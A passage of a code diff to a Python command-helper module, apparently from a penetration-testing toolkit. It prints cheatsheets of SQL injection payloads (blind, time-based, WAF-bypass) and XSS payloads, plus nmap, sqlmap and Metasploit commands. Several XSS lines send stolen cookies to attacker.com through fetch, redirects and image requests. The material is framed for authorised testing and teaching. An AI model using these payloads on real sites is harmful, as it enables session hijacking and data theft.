+                     "   Real scenario: Preparing to extract user credentials"),
                 ),
             ],
             "⏱️ Time-Based Blind SQL Injection": [
                 (
                     "' OR SLEEP(5)--",
-                    "MySQL: Causes 5-second delay if injection works\n"
-                    + "   Use: When you can't see query results directly\n"
-                    + "   How: If page loads 5 seconds slower, injection succeeded\n"
-                    + "   Example: Login form → username: admin' OR SLEEP(5)-- \n"
-                    + "   Real scenario: Testing if vulnerable when error messages hidden",
+                    ("MySQL: Causes 5-second delay if injection works\n"
+                     "   Use: When you can't see query results directly\n"
+                     "   How: If page loads 5 seconds slower, injection succeeded\n"
+                     "   Example: Login form → username: admin' OR SLEEP(5)-- \n"
+                     "   Real scenario: Testing if vulnerable when error messages "
+                     "hidden"),
                 ),
                 (
                     "'; WAITFOR DELAY '00:00:05'--",
-                    "SQL Server: Same as SLEEP but for Microsoft SQL Server\n"
-                    + "   Use: When targeting Windows/MSSQL environments\n"
-                    + "   How: Waits 5 seconds before continuing execution\n"
-                    + "   Example: Search → query'; WAITFOR DELAY '00:00:05'-- \n"
-                    + "   Real scenario: Corporate intranets running Windows Server",
+                    ("SQL Server: Same as SLEEP but for Microsoft SQL Server\n"
+                     "   Use: When targeting Windows/MSSQL environments\n"
+                     "   How: Waits 5 seconds before continuing execution\n"
+                     "   Example: Search → query'; WAITFOR DELAY '00:00:05'-- \n"
+                     "   Real scenario: Corporate intranets running Windows Server"),
                 ),
                 (
                     "'; SELECT pg_sleep(5)--",
-                    "PostgreSQL: Delay function for PostgreSQL databases\n"
-                    + "   Use: When targeting PostgreSQL servers\n"
-                    + "   How: PostgreSQL-specific sleep function\n"
-                    + "   Example: ID parameter → ?id=1'; SELECT pg_sleep(5)-- \n"
-                    + "   Real scenario: Modern web apps using PostgreSQL",
+                    ("PostgreSQL: Delay function for PostgreSQL databases\n"
+                     "   Use: When targeting PostgreSQL servers\n"
+                     "   How: PostgreSQL-specific sleep function\n"
+                     "   Example: ID parameter → ?id=1'; SELECT pg_sleep(5)-- \n"
+                     "   Real scenario: Modern web apps using PostgreSQL"),
                 ),
                 (
                     "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
-                    "Advanced MySQL delay using subquery\n"
-                    + "   Use: When simple SLEEP() is filtered\n"
-                    + "   How: Bypasses some WAF filters by using subquery structure\n"
-                    + "   Example: Bypasses ModSecurity rules blocking SLEEP()\n"
-                    + "   Real scenario: Applications with Web Application Firewalls",
+                    ("Advanced MySQL delay using subquery\n"
+                     "   Use: When simple SLEEP() is filtered\n"
+                     "   How: Bypasses some WAF filters by using subquery structure\n"
+                     "   Example: Bypasses ModSecurity rules blocking SLEEP()\n"
+                     "   Real scenario: Applications with Web Application Firewalls"),
                 ),
             ],
             "✅ Boolean-Based Blind SQL Injection": [
                 (
                     "' AND 1=1--",
-                    "Always true condition - should return normal results\n"
-                    + "   Use: Testing if blind injection works\n"
-                    + "   How: If page looks normal, injection point exists",
+                    ("Always true condition - should return normal results\n"
+                     "   Use: Testing if blind injection works\n"
+                     "   How: If page looks normal, injection point exists"),
                 ),
                 (
                     "' AND 1=2--",
-                    "Always false condition - should return no/different results\n"
-                    + "   Use: Confirming blind injection by comparing with 1=1\n"
-                    + "   How: If page differs from 1=1 test, you have blind injection",
+                    ("Always false condition - should return no/different results\n"
+                     "   Use: Confirming blind injection by comparing with 1=1\n"
+                     "   How: If page differs from 1=1 test, you have blind injection"),
                 ),
                 (
                     "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
-                    "Tests if database version starts with '5' (MySQL 5.x)\n"
-                    + "   Use: Fingerprinting database version\n"
-                    + "   How: Change number to identify exact version",
+                    ("Tests if database version starts with '5' (MySQL 5.x)\n"
+                     "   Use: Fingerprinting database version\n"
+                     "   How: Change number to identify exact version"),
                 ),
                 (
                     "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
-                    "Tests if information_schema exists (confirms MySQL/PostgreSQL)\n"
-                    + "   Use: Database fingerprinting\n"
-                    + "   How: Only MySQL and PostgreSQL have information_schema",
+                    ("Tests if information_schema exists (confirms MySQL/PostgreSQL)\n"
+                     "   Use: Database fingerprinting\n"
+                     "   How: Only MySQL and PostgreSQL have information_schema"),
                 ),
             ],
         }
@@ -829,15 +910,16 @@ class CommandHelper(BaseModule):
                 print(f"\n\033[94m{i}. Payload:\033[0m \033[92m{payload}\033[0m")
                 print(f"\033[93m   Description:\033[0m {description}")
 
-        print(f"\n\033[91m⚠️  IMPORTANT SAFETY NOTES:\033[0m")
+        print("\n\033[91m⚠️  IMPORTANT SAFETY NOTES:\033[0m")
         print("• Only test on systems you own or have explicit permission to test")
         print("• SQL injection can cause data loss - always backup before testing")
         print("• Start with safe payloads (1=1) before attempting data extraction")
         print(
-            "• Use these payloads in CTF environments and authorized penetration tests"
+            "• Use these payloads in CTF environments and authorized penetration "
+            "tests"
         )
 
-        print(f"\n\033[96m🛡️  PREVENTION FOR DEVELOPERS:\033[0m")
+        print("\n\033[96m🛡️  PREVENTION FOR DEVELOPERS:\033[0m")
         print("• Use parameterized queries/prepared statements")
         print("• Validate and sanitize all user input")
         print("• Use least-privilege database accounts")
@@ -850,141 +932,142 @@ class CommandHelper(BaseModule):
         )
         print(f"\033[93m{'='*80}\033[0m")
 
-        print(f"\n\033[96m📚 WHAT IS XSS (CROSS-SITE SCRIPTING)?\033[0m")
+        print("\n\033[96m📚 WHAT IS XSS (CROSS-SITE SCRIPTING)?\033[0m")
         print(
-            "XSS allows attackers to inject malicious scripts into web pages viewed by"
-        )
-        print(
-            "other users. The scripts execute in victims' browsers with site privileges."
+            "XSS allows attackers to inject malicious scripts into web pages viewed "
+            "by other users. The scripts execute in victims' browsers with site "
+            "privileges."
         )
 
         payloads_with_descriptions = {
             "🎯 Basic XSS Payloads (Start Here)": [
                 (
                     "<script>alert('XSS')</script>",
-                    "Classic JavaScript execution test\n"
-                    + "   Use: Testing if XSS is possible at all\n"
-                    + "   How: Injects JavaScript that shows alert popup\n"
-                    + "   Example: Search box input → <script>alert('XSS')</script>\n"
-                    + "   Real scenario: Blog comment section, feedback forms",
+                    ("Classic JavaScript execution test\n"
+                     "   Use: Testing if XSS is possible at all\n"
+                     "   How: Injects JavaScript that shows alert popup\n"
+                     "   Example: Search box, comment forms, user profiles\n"
+                     "   Real scenario: Testing input validation on web forms"),
                 ),
                 (
                     "<img src=x onerror=alert('XSS')>",
-                    "Uses broken image to trigger JavaScript\n"
-                    + "   Use: When script tags are filtered\n"
-                    + "   How: Browser tries to load image 'x', fails, runs onerror code\n"
-                    + "   Example: Profile picture upload → filename: <img src=x onerror=alert('XSS')>\n"
-                    + "   Real scenario: File upload forms, avatar settings, image galleries",
-                ),
-                (
-                    "<svg onload=alert('XSS')>",
-                    "Uses SVG element with onload event\n"
-                    + "   Use: Modern alternative when img tags are blocked\n"
-                    + "   How: SVG loads immediately and triggers onload event\n"
-                    + "   Example: Rich text editor → <svg onload=alert('XSS')>\n"
-                    + "   Real scenario: Forums, blog posts, HTML email templates",
+                    ("Image tag with error handler - bypasses script tag filters\n"
+                     "   Use: When <script> tags are blocked\n"
+                     "   How: Invalid image src triggers onerror event\n"
+                     "   Example: Profile picture upload, image galleries\n"
+                     "   Real scenario: Bypassing WAF rules that block script tags"),
                 ),
                 (
                     "javascript:alert('XSS')",
-                    "JavaScript URL scheme execution\n"
-                    + "   Use: In href attributes, form actions, or URL bars\n"
-                    + "   How: Browser interprets javascript: URLs as code to execute\n"
-                    + "   Example: Contact form → Website field: javascript:alert('XSS')\n"
-                    + "   Real scenario: Social media profiles, business listings",
+                    ("JavaScript protocol in href attributes\n"
+                     "   Use: In link href attributes\n"
+                     "   How: Executes JavaScript when link is clicked\n"
+                     "   Example: User profile links, navigation menus\n"
+                     "   Real scenario: Social media profile links, user-generated content"),
+                ),
+                (
+                    "<svg onload=alert('XSS')>",
+                    ("SVG with onload event - modern XSS technique\n"
+                     "   Use: When traditional methods are filtered\n"
+                     "   How: SVG onload event executes when image loads\n"
+                     "   Example: Image uploads, avatar systems\n"
+                     "   Real scenario: Modern web applications with SVG support"),
                 ),
             ],
-            "🔄 Filter Bypass Techniques": [
+            "🔍 Reflected XSS (Non-Persistent)": [
                 (
-                    "<ScRiPt>alert('XSS')</ScRiPt>",
-                    "Case variation to bypass simple filters\n"
-                    + "   Use: When filters only check lowercase 'script'\n"
-                    + "   How: HTML is case-insensitive, so mixed case still works\n"
-                    + "   Example: Comment form blocks <script> but allows <ScRiPt>\n"
-                    + "   Real scenario: Poorly configured CMS filters, legacy systems",
+                    "<script>alert(document.cookie)</script>",
+                    ("Steals user cookies - most common XSS attack\n"
+                     "   Use: When you want to steal session data\n"
+                     "   How: Accesses browser's cookie storage\n"
+                     "   Example: Search results, error messages, URL parameters\n"
+                     "   Real scenario: Stealing admin sessions, user authentication"),
                 ),
                 (
-                    "<script>alert(String.fromCharCode(88,83,83))</script>",
-                    "Character encoding to hide 'XSS' string\n"
-                    + "   Use: When keyword filters look for 'XSS' or 'alert'\n"
-                    + "   How: Converts ASCII codes (88,83,83) back to 'XSS'\n"
-                    + "   Example: Forum post filtered for 'XSS' keyword\n"
-                    + "   Real scenario: Content management systems with keyword blocking",
+                    "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>",
+                    ("Sends stolen cookies to attacker's server\n"
+                     "   Use: When you control a server to receive stolen data\n"
+                     "   How: Makes HTTP request with stolen cookies\n"
+                     "   Example: Advanced cookie theft for session hijacking\n"
+                     "   Real scenario: Professional penetration testing, red teaming"),
                 ),
                 (
-                    "<svg/onload=alert('XSS')>",
-                    "Uses forward slash to bypass space-based filters\n"
-                    + "   Use: When spaces between tag name and attributes are filtered\n"
-                    + "   How: HTML allows / before attributes instead of spaces\n"
-                    + "   Example: Regex /svg \\w+/ doesn't match svg/onload\n"
-                    + "   Real scenario: Custom input validation with regex patterns",
-                ),
-                (
-                    "<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>",
-                    "Base64 encoding to hide malicious code\n"
-                    + "   Use: Advanced filter bypass\n"
-                    + "   How: Base64 encodes alert('XSS'); then decodes and runs it\n"
-                    + "   Example: WAF scans for alert() but misses encoded version\n"
-                    + "   Real scenario: Enterprise applications with deep packet inspection",
+                    "<script>document.location='http://attacker.com?cookie='+document.cookie</script>",
+                    ("Redirects victim to attacker's site with stolen cookies\n"
+                     "   Use: When fetch() is blocked or unavailable\n"
+                     "   How: Redirects browser to attacker's server\n"
+                     "   Example: Alternative to fetch() for data exfiltration\n"
+                     "   Real scenario: Bypassing Content Security Policy restrictions"),
                 ),
             ],
-            "⚡ Event Handler Exploitation": [
+            "💾 Stored XSS (Persistent)": [
                 (
-                    "<input onfocus=alert('XSS') autofocus>",
-                    "Auto-triggering input field XSS\n"
-                    + "   Use: When you can inject into form contexts\n"
-                    + "   How: autofocus makes input focus immediately, triggering onfocus\n"
-                    + "   Context: Form fields, user input areas",
+                    "<script>alert('Stored XSS')</script>",
+                    ("Persistent XSS that affects all users\n"
+                     "   Use: When payload is stored in database\n"
+                     "   How: Executes for every user who views the page\n"
+                     "   Example: Comments, forum posts, user profiles\n"
+                     "   Real scenario: Social media platforms, comment systems"),
                 ),
                 (
-                    "<textarea onfocus=alert('XSS') autofocus>",
-                    "Similar to input but uses textarea element\n"
-                    + "   Use: When input tags are filtered but textarea isn't\n"
-                    + "   How: Same autofocus principle with different element\n"
-                    + "   Context: Comment boxes, message fields",
+                    "<script>var img=new Image();img.src='http://attacker.com?cookie='+document.cookie;</script>",
+                    ("Stealthy cookie theft using image object\n"
+                     "   Use: When you want to avoid redirects\n"
+                     "   How: Creates invisible image request with stolen data\n"
+                     "   Example: More subtle than redirect-based theft\n"
+                     "   Real scenario: Advanced persistent threats, targeted attacks"),
                 ),
                 (
-                    "<video><source onerror=\"alert('XSS')\">",
-                    "HTML5 video element error handling\n"
-                    + "   Use: Modern browsers, when multimedia content is allowed\n"
-                    + "   How: Video source fails to load, triggers onerror event\n"
-                    + "   Context: Media-rich applications, social media sites",
-                ),
-                (
-                    "<audio src=x onerror=alert('XSS')>",
-                    "Audio element with error handling\n"
-                    + "   Use: Alternative to video when audio tags are less filtered\n"
-                    + "   How: Audio source 'x' fails, executes onerror JavaScript\n"
-                    + "   Context: Music players, podcast sites, audio applications",
+                    "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
+                    ("Obfuscated XSS using character codes\n"
+                     "   Use: Bypassing simple keyword filters\n"
+                     "   How: Converts 'alert('XSS')' to character codes\n"
+                     "   Example: Bypasses filters looking for 'alert' or 'script'\n"
+                     "   Real scenario: WAF evasion, advanced filtering bypass"),
                 ),
             ],
-            "🍪 Cookie Stealing & Data Exfiltration": [
+            "🛡️ DOM-Based XSS": [
                 (
-                    "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
-                    "Redirects user to attacker site with their cookies\n"
-                    + "   Use: Session hijacking, account takeover\n"
-                    + "   How: Changes page URL to attacker server, sends cookies as parameter\n"
-                    + "   ⚠️ DANGER: Can steal user sessions and login credentials",
+                    "<script>document.getElementById('demo').innerHTML='<img src=x onerror=alert(1)>'</script>",
+                    ("DOM manipulation XSS\n"
+                     "   Use: When JavaScript modifies page content\n"
+                     "   How: Changes DOM elements to include malicious content\n"
+                     "   Example: Single-page applications, dynamic content\n"
+                     "   Real scenario: Modern web apps using JavaScript frameworks"),
                 ),
                 (
-                    "<script>new Image().src='http://attacker.com/steal.php?cookie='+document.cookie</script>",
-                    "Silently sends cookies to attacker via image request\n"
-                    + "   Use: Covert data theft without user noticing\n"
-                    + "   How: Creates invisible image request to attacker server\n"
-                    + "   ⚠️ DANGER: Steals session data without redirecting user",
+                    "<script>eval(location.hash.substring(1))</script>",
+                    ("URL fragment-based XSS\n"
+                     "   Use: When page uses URL fragments for functionality\n"
+                     "   How: Executes code from URL after # symbol\n"
+                     "   Example: #alert('XSS') in URL\n"
+                     "   Real scenario: Client-side routing, hash-based navigation"),
+                ),
+            ],
+            "🚀 Advanced XSS Techniques": [
+                (
+                    "<script>setTimeout('alert(\\'XSS\\')',1000)</script>",
+                    ("Delayed execution XSS\n"
+                     "   Use: When you want delayed execution\n"
+                     "   How: Executes after 1 second delay\n"
+                     "   Example: Bypassing real-time detection systems\n"
+                     "   Real scenario: Evading automated security scanners"),
                 ),
                 (
-                    "<script>fetch('http://attacker.com/steal.php?cookie='+document.cookie)</script>",
-                    "Modern API for sending data to attacker server\n"
-                    + "   Use: Advanced data exfiltration in modern browsers\n"
-                    + "   How: Uses fetch API to send cookies to attacker\n"
-                    + "   ⚠️ DANGER: More reliable than image-based methods",
+                    "<script>setInterval('alert(\\'XSS\\')',2000)</script>",
+                    ("Repeated execution XSS\n"
+                     "   Use: When you want continuous execution\n"
+                     "   How: Executes every 2 seconds\n"
+                     "   Example: Persistent monitoring, continuous data theft\n"
+                     "   Real scenario: Advanced persistent threats"),
                 ),
                 (
-                    "<script>navigator.sendBeacon('http://attacker.com/steal.php', document.cookie)</script>",
-                    "Uses beacon API for reliable data transmission\n"
-                    + "   Use: Ensures data reaches attacker even if user navigates away\n"
-                    + "   How: Browser guarantees beacon delivery\n"
-                    + "   ⚠️ DANGER: Most reliable method for data theft",
+                    "<script>document.write('<script>alert(\\'XSS\\')<\\/script>')</script>",
+                    ("Nested script injection\n"
+                     "   Use: When you need to inject additional script tags\n"
+                     "   How: Uses document.write to create new script elements\n"
+                     "   Example: Complex XSS scenarios, multi-stage attacks\n"
+                     "   Real scenario: Advanced web application attacks"),
                 ),
             ],
         }
@@ -997,1722 +1080,1811 @@ class CommandHelper(BaseModule):
                 print(f"\n\033[94m{i}. Payload:\033[0m \033[92m{payload}\033[0m")
                 print(f"\033[93m   Description:\033[0m {description}")
 
-        print(f"\n\033[91m⚠️  CRITICAL SAFETY & LEGAL WARNINGS:\033[0m")
-        print("• NEVER use cookie-stealing payloads on sites you don't own")
-        print("• Session hijacking is illegal without explicit permission")
-        print("• Only test on your own applications or authorized penetration tests")
-        print("• Use alert('XSS') for proof-of-concept, avoid data exfiltration")
-        print("• Cookie theft can lead to identity theft and privacy violations")
-
-        print(f"\n\033[96m🛡️  PREVENTION FOR DEVELOPERS:\033[0m")
-        print("• Encode/escape all user input before displaying in HTML")
-        print("• Use Content Security Policy (CSP) headers")
-        print("• Validate input on both client and server side")
-        print("• Use HTTPOnly flags on session cookies")
+        print("\n\033[91m⚠️  IMPORTANT SAFETY NOTES:\033[0m")
+        print("• Only test on systems you own or have explicit permission to test")
+        print("• XSS can steal user data and compromise accounts")
+        print("• Start with simple alert() payloads before attempting data theft")
         print(
-            "• Implement proper output encoding based on context (HTML, JavaScript, CSS)"
+            "• Use these payloads in CTF environments and authorized penetration "
+            "tests"
         )
 
-        print(f"\n\033[96m📖 XSS TYPES EXPLAINED:\033[0m")
-        print("• Reflected XSS: Payload in URL/form, reflected immediately")
-        print("• Stored XSS: Payload saved in database, affects all users")
-        print("• DOM XSS: Client-side JavaScript processes unsafe data")
-        print("• Blind XSS: Payload executes in admin panels or internal systems")
+        print("\n\033[96m🛡️  PREVENTION FOR DEVELOPERS:\033[0m")
+        print("• Output encode all user input (HTML, JavaScript, CSS)")
+        print("• Use Content Security Policy (CSP) headers")
+        print("• Validate and sanitize all user input")
+        print("• Use modern frameworks with built-in XSS protection")
 
     def _display_cheatsheet(self, tool_name: str, commands: Dict[str, List[tuple]]):
-        """Display formatted cheatsheet"""
-        print(f"\n\033[93m{f'{tool_name} CHEATSHEET'.center(80)}\033[0m")
-        print(f"\033[93m{'='*80}\033[0m")
+        """Display a formatted cheatsheet for a tool"""
+        print(f"\n\033[93m{tool_name.upper()} CHEATSHEET\033[0m")
+        print(f"\033[93m{'='*len(tool_name)+'='*10}\033[0m")
 
         for category, command_list in commands.items():
-            print(f"\n\033[96m{category}:\033[0m")
-            print("-" * len(category))
+            print(f"\n\033[95m{category}\033[0m")
+            print("-" * len(category.encode("ascii", "ignore")))
 
-            for command, description in command_list:
-                print(f"  \033[92m{command:<40}\033[0m {description}")
-
-                # Option to add to favorites
-                add_fav = self.get_user_input(
-                    f"Add to favorites? (y/N): ", required=False
+            for i, (command, description) in enumerate(command_list, 1):
+                print(
+                    f"\n\033[94m{i}. Command:\033[0m \033[92m{command}\033[0m"
                 )
-                if add_fav and add_fav.lower() == "y":
-                    self.favorites.add(f"{tool_name}: {command}")
-                    self.print_success("Added to favorites")
+                print(f"\033[93m   {description}\033[0m")
 
     def _display_payload_list(self, title: str, payloads: Dict[str, List[str]]):
-        """Display formatted payload list"""
-        print(f"\n\033[93m{title.center(60)}\033[0m")
-        print(f"\033[93m{'='*60}\033[0m")
+        """Display a formatted list of payloads"""
+        print(f"\n\033[93m{title.upper()}\033[0m")
+        print(f"\033[93m{'='*len(title)}\033[0m")
 
         for category, payload_list in payloads.items():
-            print(f"\n\033[96m{category}:\033[0m")
-            print("-" * len(category))
+            print(f"\n\033[95m{category}\033[0m")
+            print("-" * len(category.encode("ascii", "ignore")))
 
             for i, payload in enumerate(payload_list, 1):
-                print(f"  \033[94m{i:2d}.\033[0m \033[92m{payload}\033[0m")
+                print(f"\n\033[94m{i}. Payload:\033[0m \033[92m{payload}\033[0m")
 
     def _search_all_cheatsheets(self, keyword: str) -> List[Dict[str, str]]:
-        """Search all cheatsheets for keyword"""
+        """Search through all cheatsheets for matching commands"""
         results = []
-        keyword_lower = keyword.lower()
 
-        # Define comprehensive cheatsheet database
-        all_cheatsheets = {
-            "Nmap": {
-                "Basic Scans": [
-                    ("nmap -sS <target>", "SYN stealth scan"),
-                    ("nmap -sT <target>", "TCP connect scan"),
-                    ("nmap -sU <target>", "UDP scan"),
-                    ("nmap -sA <target>", "ACK scan"),
-                    ("nmap -sN <target>", "Null scan"),
-                ],
-                "Advanced": [
-                    ("nmap -sS -A <target>", "Aggressive scan"),
-                    ("nmap --script vuln <target>", "Vulnerability scripts"),
-                    ("nmap -O <target>", "OS detection"),
-                    ("nmap -sV <target>", "Service version detection"),
-                ],
-            },
-            "SQLMap": {
-                "Basic Usage": [
-                    ("sqlmap -u <url>", "Basic SQL injection test"),
-                    ("sqlmap -u <url> --dbs", "List databases"),
-                    ("sqlmap -u <url> -D <db> --tables", "List tables"),
-                    ("sqlmap -u <url> --dump", "Dump data"),
-                ]
-            },
-            "Burp Suite": {
-                "Proxy": [
-                    ("Set proxy to 127.0.0.1:8080", "Configure browser proxy"),
-                    ("Target > Add to scope", "Define scan scope"),
-                    ("Proxy > Intercept > On/Off", "Toggle request interception"),
-                ]
-            },
-            "Metasploit": {
-                "Basic Commands": [
-                    ("search <term>", "Search for exploits"),
-                    ("use <exploit>", "Select exploit"),
-                    ("set RHOSTS <target>", "Set target"),
-                    ("exploit", "Run exploit"),
-                ]
-            },
-            "Gobuster": {
-                "Directory Bruteforce": [
-                    ("gobuster dir -u <url> -w <wordlist>", "Directory brute force"),
-                    (
-                        "gobuster dns -d <domain> -w <wordlist>",
-                        "DNS subdomain brute force",
-                    ),
-                    (
-                        "gobuster vhost -u <url> -w <wordlist>",
-                        "Virtual host brute force",
-                    ),
-                ]
-            },
-            "FFUF": {
-                "Web Fuzzing": [
-                    ("ffuf -w <wordlist> -u <url>/FUZZ", "Directory fuzzing"),
-                    ("ffuf -w <wordlist> -u <url>?param=FUZZ", "Parameter fuzzing"),
-                    (
-                        'ffuf -w <wordlist> -H "Host: FUZZ.<domain>" -u <url>',
-                        "Virtual host fuzzing",
-                    ),
-                ]
-            },
+        # Nmap commands
+        nmap_commands = {
+            "Basic Scans": [
+                ("nmap 192.168.1.1", "Basic port scan"),
+                ("nmap -sn 192.168.1.0/24", "Ping scan for host discovery"),
+                ("nmap -sS 192.168.1.1", "SYN stealth scan"),
+                ("nmap -sT 192.168.1.1", "TCP connect scan"),
+                ("nmap -p 1-1000 192.168.1.1", "Scan first 1000 ports"),
+                ("nmap --top-ports 100 192.168.1.1", "Scan top 100 ports"),
+                ("nmap -A 192.168.1.1", "Aggressive scan"),
+            ],
+            "Port Selection": [
+                ("nmap -p 22,80,443 192.168.1.1", "Scan specific ports"),
+                ("nmap -p- 192.168.1.1", "Scan all 65535 ports"),
+                ("nmap -O 192.168.1.1", "OS detection"),
+                ("nmap -f 192.168.1.1", "Fragment packets"),
+                ("nmap -T4 192.168.1.1", "Aggressive timing"),
+            ],
+            "Output": [
+                ("nmap -oN scan_results.txt 192.168.1.1", "Save to text file"),
+                ("nmap -oX scan_results.xml 192.168.1.1", "Save to XML file"),
+                ("nmap -oA complete_scan 192.168.1.1", "Save all formats"),
+            ],
         }
 
-        # Search through all cheatsheets
-        for tool_name, categories in all_cheatsheets.items():
-            for category_name, commands in categories.items():
-                for command, description in commands:
-                    # Check if keyword matches in any field
-                    if (
-                        keyword_lower in command.lower()
-                        or keyword_lower in description.lower()
-                        or keyword_lower in tool_name.lower()
-                        or keyword_lower in category_name.lower()
-                    ):
-                        results.append(
-                            {
-                                "tool": tool_name,
-                                "category": category_name,
-                                "command": command,
-                                "description": description,
-                            }
-                        )
+        # Metasploit commands
+        metasploit_commands = {
+            "Basic Commands": [
+                ("msfconsole", "Start Metasploit console"),
+                ("help", "Show help"),
+                ("search <term>", "Search for modules"),
+                ("use <module>", "Use a module"),
+                ("info", "Show module information"),
+                ("back", "Return to main menu"),
+            ],
+            "Module Management": [
+                ("show exploits", "List available exploits"),
+                ("show payloads", "List available payloads"),
+                ("show auxiliaries", "List auxiliary modules"),
+                ("show encoders", "List encoders"),
+                ("show nops", "List NOP generators"),
+            ],
+            "Options & Execution": [
+                ("show options", "Show module options"),
+                ("set <option> <value>", "Set option value"),
+                ("setg <option> <value>", "Set global option"),
+                ("unset <option>", "Unset option"),
+                ("run", "Execute module"),
+                ("exploit", "Execute exploit"),
+            ],
+            "Payloads": [
+                ("set payload <payload>", "Set payload"),
+                ("show payloads", "Show compatible payloads"),
+                ("generate -f exe -o payload.exe", "Generate standalone payload"),
+            ],
+            "Sessions": [
+                ("sessions -l", "List active sessions"),
+                ("sessions -i <id>", "Interact with session"),
+                ("sessions -k <id>", "Kill session"),
+                ("background", "Background current session"),
+            ],
+        }
 
-        # Also search custom commands
-        for cmd_data in self.custom_commands.values():
-            if (
-                keyword_lower in cmd_data["command"].lower()
-                or keyword_lower in cmd_data["description"].lower()
-                or keyword_lower in cmd_data["category"].lower()
-            ):
-                results.append(
-                    {
-                        "tool": "Custom",
-                        "category": cmd_data["category"],
-                        "command": cmd_data["command"],
-                        "description": cmd_data["description"],
-                    }
-                )
+        # SQLMap commands
+        sqlmap_commands = {
+            "Basic Usage": [
+                ("sqlmap -u '<url>'", "Basic SQL injection test"),
+                ("sqlmap -u '<url>' --dbs", "Enumerate databases"),
+                ("sqlmap -u '<url>' -D <db> --tables", "Enumerate tables"),
+                ("sqlmap -u '<url>' -D <db> -T <table> --columns",
+                 "Enumerate columns"),
+                ("sqlmap -u '<url>' -D <db> -T <table> -C <col> --dump",
+                 "Dump data"),
+            ],
+            "Request Options": [
+                ("--cookie='JSESSIONID=...'", "Use cookies"),
+                ("--user-agent='...'", "Custom user agent"),
+                ("--referer='...'", "Custom referer"),
+                ("--headers='X-Forwarded-For: 127.0.0.1'", "Custom headers"),
+                ("--method=POST", "Use POST method"),
+                ("--data='param=value'", "POST data"),
+            ],
+            "Detection Options": [
+                ("--level=5", "Test level (1-5)"),
+                ("--risk=3", "Risk level (1-3)"),
+                ("--technique=BEUST", "SQL injection techniques"),
+                ("--dbms=mysql", "Force DBMS type"),
+                ("--os=linux", "Force OS type"),
+            ],
+            "Advanced Features": [
+                ("--batch", "Non-interactive mode"),
+                ("--random-agent", "Use random user agent"),
+                ("--proxy=http://127.0.0.1:8080", "Use proxy"),
+                ("--tor", "Use Tor network"),
+                ("--check-tor", "Check Tor connection"),
+                ("--flush-session", "Flush session files"),
+            ],
+        }
+
+        # Search through all command dictionaries
+        all_commands = {
+            "Nmap": nmap_commands,
+            "Metasploit": metasploit_commands,
+            "SQLMap": sqlmap_commands,
+        }
+
+        for tool, categories in all_commands.items():
+            for category, command_list in categories.items():
+                for command, description in command_list:
+                    if keyword in command.lower() or keyword in description.lower():
+                        results.append({
+                            "tool": tool,
+                            "category": category,
+                            "command": command,
+                            "description": description,
+                        })
 
         return results
 
     def _add_custom_command(self):
-        """Add custom command"""
+        """Add a custom command to the collection"""
         name = self.get_user_input("Enter command name: ")
         if not name:
             return
 
-        command = self.get_user_input("Enter command: ")
+        command = self.get_user_input("Enter the command: ")
         if not command:
             return
 
         description = self.get_user_input("Enter description: ")
-        category = (
-            self.get_user_input("Enter category (optional): ", required=False)
-            or "Custom"
-        )
+        if not description:
+            return
 
         self.custom_commands[name] = {
             "command": command,
             "description": description,
-            "category": category,
             "created": datetime.now().isoformat(),
         }
 
-        self.print_success(f"Custom command '{name}' added")
+        self.print_success(f"Added custom command: {name}")
 
     def _view_custom_commands(self):
-        """View custom commands"""
+        """View all custom commands"""
         if not self.custom_commands:
-            self.print_warning("No custom commands saved")
+            self.print_info("No custom commands saved")
             return
 
-        print(f"\n\033[93m{'CUSTOM COMMANDS'.center(60)}\033[0m")
-        print(f"\033[93m{'-'*60}\033[0m")
-
-        for name, cmd_info in self.custom_commands.items():
-            print(f"\n\033[96m{name}\033[0m")
-            print(f"  Command: \033[92m{cmd_info['command']}\033[0m")
-            print(f"  Description: {cmd_info['description']}")
-            print(f"  Category: {cmd_info['category']}")
+        print("\nCustom Commands:")
+        for name, details in self.custom_commands.items():
+            print(f"\n\033[96m{name}:\033[0m")
+            print(f"  Command: \033[92m{details['command']}\033[0m")
+            print(f"  Description: {details['description']}")
+            print(f"  Created: {details['created']}")
 
     def _edit_custom_command(self):
-        """Edit custom command"""
+        """Edit an existing custom command"""
         if not self.custom_commands:
-            self.print_warning("No custom commands to edit")
+            self.print_info("No custom commands to edit")
             return
 
-        print("Available custom commands:")
+        print("\nAvailable commands:")
         for i, name in enumerate(self.custom_commands.keys(), 1):
             print(f"\033[96m{i}.\033[0m {name}")
 
-        choice = self.get_user_input("Select command to edit: ")
-        if choice and choice.isdigit():
-            cmd_names = list(self.custom_commands.keys())
-            idx = int(choice) - 1
-            if 0 <= idx < len(cmd_names):
-                name = cmd_names[idx]
-                print(f"Editing: {name}")
+        try:
+            user_input = self.get_user_input("Select command to edit: ")
+            if user_input is None:
+                return
+            choice = int(user_input) - 1
+            command_names = list(self.custom_commands.keys())
+            if 0 <= choice < len(command_names):
+                name = command_names[choice]
+                print(f"\nEditing: {name}")
+                print(f"Current command: {self.custom_commands[name]['command']}")
+                print(f"Current description: {self.custom_commands[name]['description']}")
 
-                new_command = self.get_user_input(
-                    "Enter new command (or press Enter to keep current): ",
-                    required=False,
-                )
-                new_description = self.get_user_input(
-                    "Enter new description (or press Enter to keep current): ",
-                    required=False,
-                )
-
+                new_command = self.get_user_input("New command (or press Enter to keep current): ")
                 if new_command:
                     self.custom_commands[name]["command"] = new_command
+
+                new_description = self.get_user_input("New description (or press Enter to keep current): ")
                 if new_description:
                     self.custom_commands[name]["description"] = new_description
 
-                self.print_success("Custom command updated")
+                self.print_success(f"Updated command: {name}")
+            else:
+                self.print_error("Invalid selection")
+        except ValueError:
+            self.print_error("Please enter a valid number")
 
     def _delete_custom_command(self):
-        """Delete custom command"""
+        """Delete a custom command"""
         if not self.custom_commands:
-            self.print_warning("No custom commands to delete")
+            self.print_info("No custom commands to delete")
             return
 
-        print("Available custom commands:")
+        print("\nAvailable commands:")
         for i, name in enumerate(self.custom_commands.keys(), 1):
             print(f"\033[96m{i}.\033[0m {name}")
 
-        choice = self.get_user_input("Select command to delete: ")
-        if choice and choice.isdigit():
-            cmd_names = list(self.custom_commands.keys())
-            idx = int(choice) - 1
